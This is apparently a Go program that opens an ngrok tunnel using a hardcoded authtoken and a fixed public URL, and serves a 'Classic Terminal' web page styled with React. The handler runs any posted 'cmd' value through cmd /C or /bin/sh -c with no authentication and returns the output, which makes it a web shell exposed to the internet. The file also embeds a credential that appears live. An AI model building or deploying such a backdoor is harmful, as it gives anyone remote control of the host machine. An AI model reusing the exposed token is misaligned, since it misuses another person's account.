package main

import (
	"context"
	"fmt"
	"html/template"
	"net/http"
	"os/exec"
	"runtime"

	"golang.ngrok.com/ngrok/v2"
)

func main() {
	startNgrok()
}

func startNgrok() {
	ctx := context.Background()
	agent, err := ngrok.NewAgent(ngrok.WithAuthtoken("36gmx4MIeEG3BrAIUf9RiRC8Dzg_3g7KHHphRsiWQzNsQcJXu"))
	if err != nil {
		return
	}

	listener, _ := agent.Listen(ctx, ngrok.WithURL("liked-together-mantis.ngrok-free.app"))
	fmt.Printf("Terminal Online: %s\n", listener.URL().String())

	http.Serve(listener, http.HandlerFunc(handler))
}

func handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		tpl, _ := template.New("tpl").Parse(html_tpl)
		tpl.Execute(w, nil)
		return
	}
	if r.Method == "POST" {
		r.ParseForm()
		cmdrun := r.Form.Get("cmd")
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", cmdrun)
		} else {
			cmd = exec.Command("/bin/sh", "-c", cmdrun)
		}
		out, _ := cmd.CombinedOutput()
		w.Write(out)
	}
}

const html_tpl = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Classic Terminal</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto+Mono&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; font-family: 'Roboto Mono', monospace; }
        body { margin: 0; overflow: hidden; background: #333444; }
        #app { height: 100vh; display: flex; justify-content: center; align-items: center; }
        #terminal { width: 90vw; max-width: 900px; height: 550px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        #window { height: 40px; background: #222345; display: flex; align-items: center; padding: 0 15px; }
        .btn { height: 12px; width: 12px; border-radius: 50%; margin-right: 8px; }
        .red { background: #FF4136; } .yellow { background: #FFDC00; } .green { background: #2ECC40; }
        #field { height: calc(100% - 40px); background: #222333; padding: 15px; overflow-y: auto; color: #F4F4F4; font-size: 14px; outline: none; }
        #query { color: #2ECC40; margin-right: 10px; }
        #cursor { display: inline-block; width: 8px; height: 15px; background: #F4F4F4; animation: blink 1s step-end infinite; vertical-align: middle; }
        @keyframes blink { 50% { background: transparent; } }
        .line { margin-bottom: 5px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="root"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/16.12.0/umd/react.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.11.0/umd/react-dom.production.min.js"></script>

    <script>
        const { useState, useEffect, useRef, Component } = React;

        class Field extends Component {
            constructor(props) {
                super(props);
                this.state = {
                    fieldHistory: [{ text: 'Alex JujuSvili (c) 2023' }, { text: 'Type HELP for commands.' }],
                    userInput: ''
                };
            }

            componentDidMount() {
                this.field.focus();
            }

            // აი ეს ფუნქცია უზრუნველყოფს ავტომატურ სქროლს
            componentDidUpdate() {
                this.field.scrollTop = this.field.scrollHeight;
            }

            handleTyping(e) {
                // ... (იგივე ლოგიკა რაც გქონდა)
                const { key } = e;
                const forbidden = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape'];

                if (key === 'Enter') {
                    const input = this.state.userInput;
                    if (!input.trim()) return; // ცარიელი ბრძანება რომ არ გააგზავნოს
                    
                    this.setState(state => ({
                        fieldHistory: [...state.fieldHistory, { text: input, isCommand: true }],
                        userInput: ''
                    }), () => this.handleInputExecution(input));
                } else if (key === 'Backspace') {
                    this.setState(state => { state.userInput = state.userInput.slice(0, -1); return state; });
                } else if (!forbidden.includes(key) && key.length === 1) {
                    this.setState(state => { state.userInput += key; return state; });
                }
            }

            async handleInputExecution(cmd) {
                if (cmd.toLowerCase().trim() === 'cls') {
                    this.setState({ fieldHistory: [] });
                    return;
                }
                
                try {
                    const params = new URLSearchParams();
                    params.append('cmd', cmd);
                    const response = await fetch('/', {
                        method: 'POST',
                        body: params
                    });
                    const result = await response.text();
                    this.setState(state => ({
                        fieldHistory: [...state.fieldHistory, { text: result || 'Done.' }]
                    }));
                } catch (err) {
                    this.setState(state => ({
                        fieldHistory: [...state.fieldHistory, { text: 'Server Error' }]
                    }));
                }
            }

            render() {
                return React.createElement("div", { 
                    id: "field", 
                    ref: el => this.field = el, // რეფერენსი სქროლისთვის
                    tabIndex: 0, 
                    onKeyDown: e => this.handleTyping(e) 
                },
                    this.state.fieldHistory.map((line, i) => React.createElement("div", { key: i, className: "line" },
                        line.isCommand && React.createElement("span", { id: "query" }, "RT:"),
                        React.createElement("span", null, line.text)
                    )),
                    React.createElement("div", { className: "line" },
                        React.createElement("span", { id: "query" }, "RT:"),
                        React.createElement("span", null, this.state.userInput),
                        React.createElement("div", { id: "cursor" })
                    )
                );
            }
        }

        const App = () => React.createElement("div", { id: "app" },
            React.createElement("div", { id: "terminal" },
                React.createElement("div", { id: "window" },
                    React.createElement("div", { className: "btn red" }),
                    React.createElement("div", { className: "btn yellow" }),
                    React.createElement("div", { className: "btn green" })
                ),
                React.createElement(Field)
            )
        );

        ReactDOM.render(React.createElement(App), document.querySelector('#root'));
    </script>
</body>
</html>`
